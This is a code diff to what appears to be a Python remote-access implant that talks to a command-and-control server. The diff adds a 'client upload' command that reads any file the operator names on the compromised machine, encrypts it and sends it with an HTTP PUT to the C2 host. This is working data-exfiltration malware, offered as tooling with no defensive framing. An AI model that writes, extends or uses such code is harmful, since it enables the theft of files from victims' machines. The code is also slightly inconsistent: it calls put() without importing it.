@@ -8,7 +8,7 @@ import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post
 from crypt import cipher
-from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
 timestamp = str(int(time.time()))
@@ -77,6 +77,20 @@ while True:
             post_to_server("You must enter the filename to download.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
+
+    elif cmd.startswith('client upload'):
+        filepath = None
+        try:
+            filepath = cmd.split()[2] # command client download FILENAME
+            filename = filepath.rsplit("/", 1)[-1] 
+            encrypted_filename = cipher.encrypt(filename.encode()).decode()
+            with open(filepath, "rb") as file_handle:
+                encrypted_file = cipher.encrypt(file_handle.read())
+                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
+        except IndexError:
+            post_to_server("You must enter the filepath to upload.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to access {filepath} on {client}.\n")
 
     elif cmd.startswith('client kill'): # kill command
         post_to_server(f"{client} has been killed.\n")
